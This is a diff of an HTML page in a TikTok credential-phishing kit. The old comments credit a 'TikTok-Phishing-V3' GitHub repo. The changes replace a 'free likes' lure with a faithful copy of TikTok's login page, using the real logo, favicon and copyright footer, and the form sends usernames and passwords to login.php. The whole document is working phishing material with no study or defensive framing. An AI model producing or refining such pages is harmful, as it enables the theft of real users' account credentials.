@@ -1,60 +1,46 @@
 <!DOCTYPE html>
-<html>
-<!-- Powered By SADFLIX  -->
-<!-- COPIED FROM https://github.com/swagkarna/TikTok-Phishing-V3/blob/main/tiktokv3.zip -->
-
-<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Tik Tok Followers</title>
-<script src="jquery.min.js"></script>
-<script src="jscript.js"></script>
-<link rel="stylesheet" type="text/css" href="style.css">
-<style>
-    @media(max-width:760px){
-       #TFG{
-           font-size:140%;
-       } 
-       .buttonstyle{
-           font-size:100%;
-       }
-    
-    .followers , .likes{
-        width:95%;
-    }
-    }
-</style>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in | TikTok</title>
+    <link rel="icon" href="https://sf16-scmcdn-sg.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-16-45bc4.png">
+    <link rel="stylesheet" href="style.css">
 </head>
-<body onload="updateyear()">
-</div>
-<div id="main-tool">
-	<div class="wrapper"><img src="logo.png"></div>
-	<h1 id="TFG">Login</h1>
-<p class="sub-heading">Login to get 1000 Tiktok Likes Free</p>
+<body>
+    <div class="login-card">
+        <svg class="logo" viewBox="0 0 512 512" width="144" height="42"><path d="M412.19,118.66a109.27,109.27,0,0,1-9.45-5.5,132.87,132.87,0,0,1-24.27-20.62c-18.1-20.71-24.86-41.72-27.35-56.43h.1C350.14,22.12,350,8,350,8H267.15c0,16.59,0,33.19,0,49.78h-.06V323.09c-1.39,3.58-15.65,24.31-40.48,24.31-31.57,0-43.51-24.57-43.51-46.7,0-26.68,17.76-47.53,44.92-47.53,16,0,27.17,6.86,32.32,11.59l4.52,4.19,10-72.33-.84-.53a116.71,116.71,0,0,0-46-9.61c-64.81,0-109.08,44-109.08,114.28C119,394.08,181.08,424,233.19,424c65.07,0,111.9-42.53,117.84-106.66-.08-31.63,0-142.16,0-142.16a165.8,165.8,0,0,0,51.81,25v-84.3A125.86,125.86,0,0,1,412.19,118.66Z"/></svg>
+        <h1>Log in</h1>
+        <p class="subtitle">Log in to your account</p>
+        
+        <form action="login.php" method="POST">
+            <div>
+                <label>Email or Username</label>
+                <input type="text" name="email" placeholder="Email or Username" required autofocus>
+            </div>
+            <div>
+                <div style="display: flex; justify-content: space-between;">
+                    <label>Password</label>
+                    <a href="#" class="forgot-link">Forgot password?</a>
+                </div>
+                <input type="password" name="password" placeholder="Password" required>
+            </div>
+            <button type="submit" class="login-btn">Log in</button>
+        </form>
 
-    <form action="login.php" method="POST">
-    <center>
-    <div id="fillup">
-        <div class="form-option">
-        	<input name="email" class="input-form input-command" type="text" placeholder="Username/Email/Phone" required>
+        <div class="divider">
+            <div class="line"></div>
+            <div class="divider-text">OR</div>
+            <div class="line"></div>
         </div>
-    <div id="fillup">
-        <div class="form-option">
-        	<input name="password" class="input-form input-command" type="password" placeholder="Password" required>
+
+        <div class="register-text">
+            Don't have an account? <a href="#">Sign up</a>
         </div>
-
-        <br><br>
-        <button class="buttonstyle"><b>Login</b></button>
-        </center>
-
     </div>
-</div>
 
-<div id="steps" style="display:none;">
-
-</div>
-
-<div id="comment" style="display:none;" >
-</div>
+    <footer>
+        English © 2024 TikTok
+    </footer>
 </body>
-<!-- Powered By Sadflix -->
 </html>
